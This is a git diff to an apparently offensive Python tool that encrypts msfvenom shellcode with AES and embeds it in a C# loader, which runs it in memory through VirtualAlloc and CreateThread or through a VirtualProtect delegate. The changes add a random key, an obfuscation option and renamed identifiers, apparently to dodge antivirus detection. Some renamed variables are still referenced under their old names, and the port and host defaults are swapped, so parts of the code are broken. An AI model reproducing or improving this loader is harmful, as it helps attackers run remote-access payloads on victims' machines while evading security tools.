@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-import array, base64
+import array, base64, random, string
 from Crypto.Cipher import AES
 from hashlib import sha256
 import argparse, subprocess, os
@@ -8,7 +8,7 @@ def main():
 	args = parse_args()
 	lhost = args.lhost
 	lport = args.lport
-	key = args.key
+	key = get_random_string(32)
 	payload = args.payload
 	filename = args.filename
 	arch = args.arch
@@ -26,7 +26,7 @@ def main():
 	buf = result.stdout
 
 	''' encrypt the payload '''
-	print("[+] Encrypting the payload...")
+	print("[+] Encrypting the payload, key=" + key + "...")
 	hkey = hash_key(key)
 	encrypted = encrypt(hkey, hkey[:16], buf)
 	b64 = base64.b64encode(encrypted)
@@ -43,6 +43,10 @@ def main():
 	template = get_decryptor_template()
 	template = template.replace('~BASE64~', b64.decode('utf-8'))
 	template =  template.replace('~KEY~', key)
+
+	''' obfuscating the code '''
+	print("[!] Obfscating the code...")
+	print("    Be patient! I'm working on it ok!!!")
 
 	''' include required code based on method '''
 	if(method == "delegate"):
@@ -98,8 +102,6 @@ def pad(data, block_size):
 def parse_args():
 	parser = argparse.ArgumentParser()
 
-	parser.add_argument("-k", "--key", default="l33tcrpyto", type=str,
-		help="The key used to encrypt the msfvenom payload.")
 	parser.add_argument("-l", "--lport", default="0.0.0.0", type=str,
 		help="The local port that msfconsole is listening on.")
 	parser.add_argument("-i", "--lhost", default="4444", type=str,
@@ -114,9 +116,15 @@ def parse_args():
 		help="Output the base64 encrypted payload only.")
 	parser.add_argument("-m", "--method", default="thread", type=str,
 		help="The method to use: thread/delegate.")
-
+	parser.add_argument("-o", "--obfuscate", action="store_true",
+		help="Obfuscate the csharp code.")
 
 	return parser.parse_args()
+
+def get_random_string(length):
+	letters = string.ascii_lowercase
+	result_str = ''.join(random.choice(letters) for i in range(length))
+	return result_str
 
 def get_decryptor_template():
 	return '''
@@ -180,61 +188,60 @@ DELEGATE */
             RunShellcode(dec_shellcode);
         }
 
-        public static void RunShellcode(byte[] shellcode)
+        public static void RunShellcode(byte[] s)
         {
 /* THREAD
-            IntPtr buffer = VirtualAlloc(IntPtr.Zero, (UInt32)shellcode.Length, 0x1000, 0x40);
-            Marshal.Copy(shellcode, 0, (IntPtr)(buffer), shellcode.Length);
-            IntPtr thread = IntPtr.Zero;
-            UInt32 threadId = 0;
-            thread = CreateThread(IntPtr.Zero, 0, buffer, IntPtr.Zero, 0, ref threadId);
-            WaitForSingleObject(thread, 0xFFFFFFFF);
+            IntPtr fer = VirtualAlloc(IntPtr.Zero, (UInt32)shellcode.Length, 0x1000, 0x40);
+            Marshal.Copy(shellcode, 0, (IntPtr)(fer), s.Length);
+            IntPtr tj = IntPtr.Zero;
+            UInt32 did = 0;
+            thread = CreateThread(IntPtr.Zero, 0, fer, IntPtr.Zero, 0, ref did);
+            WaitForSingleObject(tj, 0xFFFFFFFF);
 THREAD */
 /* DELEGATE
 						unsafe
             {
-                fixed(byte* ptr = shellcode)
+                fixed(byte* ptr = s)
                 {
-                    IntPtr memAddr = (IntPtr)ptr;
+                    IntPtr mad = (IntPtr)ptr;
 
-                    VirtualProtect(memAddr, (UIntPtr)shellcode.Length, (uint)0x40, out uint lpflOldProtect);
+                    VirtualProtect(mad, (UIntPtr)s.Length, (uint)0x40, out uint lpflOldProtect);
 
-                    PrototypeFunc func = (PrototypeFunc)Marshal.GetDelegateForFunctionPointer(memAddr, typeof(PrototypeFunc));
-                    func();
+                    PrototypeFunc fn = (PrototypeFunc)Marshal.GetDelegateForFunctionPointer(mad, typeof(PrototypeFunc));
+                    fn();
                 }
             }
 DELEGATE */
         }
 
-        static byte[] Decrypt(string key, string aes_base64)
+        static byte[] Decrypt(string k, string srd)
         {
-            byte[] tempKey = Encoding.ASCII.GetBytes(key);
-            tempKey = SHA256.Create().ComputeHash(tempKey);
+            byte[] tK = Encoding.ASCII.GetBytes(k);
+            tK = SHA256.Create().ComputeHash(tK);
 
-            byte[] data = Convert.FromBase64String(aes_base64);
+            byte[] f = Convert.FromBase64String(srd);
 
-            // decrypt data
-            Aes aes = new AesManaged();
-            aes.Mode = CipherMode.CBC;
-            aes.Padding = PaddingMode.PKCS7;
-            ICryptoTransform dec = aes.CreateDecryptor(tempKey, SubArray(tempKey, 16));
+            Aes a = new AesManaged();
+            a.Mode = CipherMode.CBC;
+            a.Padding = PaddingMode.PKCS7;
+            ICryptoTransform dc = a.CreateDecryptor(tK, sa(tK, 16));
 
-            using (MemoryStream msDecrypt = new MemoryStream())
+            using (MemoryStream ms = new MemoryStream())
             {
-                using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, dec, CryptoStreamMode.Write))
+                using (CryptoStream cs = new CryptoStream(ms, dc, CryptoStreamMode.Write))
                 {
 
-                    csDecrypt.Write(data, 0, data.Length);
+                    cs.Write(f, 0, f.Length);
 
-                    return msDecrypt.ToArray();
+                    return ms.ToArray();
                 }
             }
         }
 
-        static byte[] SubArray(byte[] a, int length)
+        static byte[] sa(byte[] a, int l)
         {
-            byte[] b = new byte[length];
-            for (int i = 0; i < length; i++)
+            byte[] b = new byte[l];
+            for (int i = 0; i < l; i++)
             {
                 b[i] = a[i];
             }
